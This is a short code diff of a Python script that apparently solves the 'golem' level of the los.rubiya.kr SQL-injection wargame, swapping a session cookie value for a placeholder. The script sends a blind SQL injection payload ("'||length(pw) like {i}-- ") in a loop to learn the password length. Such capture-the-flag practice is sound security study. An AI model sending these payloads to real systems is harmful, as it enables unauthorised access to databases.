@@ -1,7 +1,7 @@
 import requests as req 
 
 url="https://los.rubiya.kr/chall/golem_4b5202cfedd8160e73124b5234235ef5.php"
-ck={"PHPSESSID":"uc6eohgs2j6aihdl3pde9v2692"}
+ck={"PHPSESSID":"냠냠"}
 
 for i in range(100):
 	params = {"pw":f"'||length(pw) like {i}-- "}
